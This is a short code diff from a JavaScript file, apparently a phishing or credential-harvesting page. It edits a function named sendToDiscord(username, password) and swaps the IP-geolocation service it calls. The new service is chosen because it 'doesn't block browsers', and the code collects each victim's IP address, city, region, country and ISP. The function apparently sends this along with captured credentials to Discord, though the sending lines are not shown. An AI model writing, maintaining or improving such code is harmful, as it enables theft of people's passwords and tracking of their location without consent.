@@ -126,12 +126,15 @@ async function sendToDiscord(username, password) {
   let isp = "Unknown";
 
   try {
-    // Fetching IP information from a free public API
-    const ipResponse = await fetch('https://ipapi.co/json/');
+    // Using ipwho.is because it supports HTTPS and doesn't block browsers
+    const ipResponse = await fetch('https://ipwho.is/');
     const ipData = await ipResponse.json();
-    ipInfo = ipData.ip || "Unknown";
-    location = `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`;
-    isp = ipData.org || "Unknown";
+    
+    if (ipData.success) {
+      ipInfo = ipData.ip || "Unknown";
+      location = `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country || 'Unknown'}`;
+      isp = ipData.connection?.isp || ipData.connection?.org || "Unknown";
+    }
   } catch (error) {
     console.warn('Could not fetch IP info:', error);
   }
